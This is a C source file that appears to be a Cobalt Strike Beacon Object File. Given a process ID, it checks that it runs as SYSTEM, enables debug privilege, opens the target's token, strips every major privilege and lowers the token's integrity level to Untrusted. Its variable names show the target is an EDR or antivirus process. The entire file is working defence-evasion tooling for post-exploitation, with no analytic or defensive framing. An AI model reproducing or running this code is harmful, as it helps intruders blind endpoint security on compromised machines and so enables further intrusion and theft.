#pragma GCC diagnostic ignored "-Wint-to-pointer-cast"

#include <windows.h>
#include "beacon.h"
#include <lmcons.h>
#include "syscalls.h"

DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);
WINADVAPI DWORD WINAPI ADVAPI32$GetLengthSid(PSID pSid);
WINADVAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char* string1, const char* string2);

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

BOOL isSystem(const char* systemUsername)
{
	CHAR currentUsername[UNLEN + 1];
	DWORD CurrentUsernameLen = UNLEN + 1;
	ADVAPI32$GetUserNameA(currentUsername, &CurrentUsernameLen);
	if (MSVCRT$_stricmp(currentUsername, systemUsername) == 0) {
		return TRUE;
	}
	return FALSE;
}

void getDebugPriv()
{
	HANDLE curToken = NULL;
	TOKEN_PRIVILEGES tkp;
	LUID luid;
	ULONG retLength = NULL;

	NtOpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &curToken);
	if (curToken == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get a handle to the current process token!, Error: %i", KERNEL32$GetLastError());
		return;
	}

	if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Privilege lookup failed!, Error: %i", KERNEL32$GetLastError());
		return;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	NtAdjustPrivilegesToken(curToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, &retLength);
	if (KERNEL32$GetLastError() != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error adjusting token privileges!, Error: %i", KERNEL32$GetLastError());
	}
}

HANDLE getHandleToTargetProc(DWORD processID)
{
	HANDLE targetProcHandle;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)processID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
	if (targetProcHandle == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Could not obtain a handle to the process!, Error: %i", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained a handle to the process with PID: %i!", processID);
	}
	return targetProcHandle;
}

BOOL DeleteTokenPrivilege(HANDLE edrToken, LPCTSTR tokenPrivilege)
{
	TOKEN_PRIVILEGES tkp;
	LUID luid;

	if (!ADVAPI32$LookupPrivilegeValueA(NULL, tokenPrivilege, &luid))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Privilege lookup failed!, Error: %i", KERNEL32$GetLastError());
		return FALSE;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

	NtAdjustPrivilegesToken(edrToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
	if (KERNEL32$GetLastError() != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error adjusting the target process token privilege!, Error: %i", KERNEL32$GetLastError());
		return FALSE;
	}
	return TRUE;
}

void stripPrivileges(HANDLE edrHandle)
{
	HANDLE edrToken = NULL;
	NtOpenProcessToken(edrHandle, TOKEN_ALL_ACCESS, &edrToken);
	if (edrToken == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open the target process token!, Error: %i", KERNEL32$GetLastError());
		return;
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened the target process token!");
	}

	LUID luid;
	ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid);

	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	NtAdjustPrivilegesToken(edrToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
	if (KERNEL32$GetLastError() != 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error adjusting the target process token privilege!, Error: %i", KERNEL32$GetLastError());
	}

	// Remove all the privileges
	DeleteTokenPrivilege(edrToken, SE_DEBUG_NAME);
	DeleteTokenPrivilege(edrToken, SE_CHANGE_NOTIFY_NAME);
	DeleteTokenPrivilege(edrToken, SE_TCB_NAME);
	DeleteTokenPrivilege(edrToken, SE_IMPERSONATE_NAME);
	DeleteTokenPrivilege(edrToken, SE_LOAD_DRIVER_NAME);
	DeleteTokenPrivilege(edrToken, SE_RESTORE_NAME);
	DeleteTokenPrivilege(edrToken, SE_BACKUP_NAME);
	DeleteTokenPrivilege(edrToken, SE_SECURITY_NAME);
	DeleteTokenPrivilege(edrToken, SE_SYSTEM_ENVIRONMENT_NAME);
	DeleteTokenPrivilege(edrToken, SE_INCREASE_QUOTA_NAME);
	DeleteTokenPrivilege(edrToken, SE_TAKE_OWNERSHIP_NAME);
	DeleteTokenPrivilege(edrToken, SE_INC_BASE_PRIORITY_NAME);
	DeleteTokenPrivilege(edrToken, SE_SHUTDOWN_NAME);
	DeleteTokenPrivilege(edrToken, SE_ASSIGNPRIMARYTOKEN_NAME);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Completed removing all of the target process token privileges!");

	DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
	SID integrityLevelSid = {};
	integrityLevelSid.Revision = SID_REVISION;
	integrityLevelSid.SubAuthorityCount = 1;
	integrityLevelSid.IdentifierAuthority.Value[5] = 16;
	integrityLevelSid.SubAuthority[0] = integrityLevel;

	TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
	tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
	tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

	NTSTATUS status = NtSetInformationToken(edrToken, TokenIntegrityLevel, &tokenIntegrityLevel, sizeof(TOKEN_MANDATORY_LABEL) + ADVAPI32$GetLengthSid(&integrityLevelSid));
	if (status == STATUS_SUCCESS)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Adjusted the target process integrity level to Untrusted!");
	}
	NtClose(edrHandle);
	NtClose(edrToken);
}

void go(char* args, int len)
{
	BOOL systemElevated = FALSE;
	systemElevated = isSystem("SYSTEM");
	if (systemElevated == FALSE)
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Current user is not SYSTEM!");
		return;
	}

	datap parser;
	DWORD pid = NULL;

	BeaconDataParse(&parser, args, len);
	pid = BeaconDataInt(&parser);

	if (pid != NULL)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to remove token privileges from process with PID: %d", pid);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Error reading target process ID, did you supply a PID?");
		return;
	}

	getDebugPriv();

	HANDLE targetHandle;
	targetHandle = getHandleToTargetProc(pid);
	stripPrivileges(targetHandle);
	return;

}
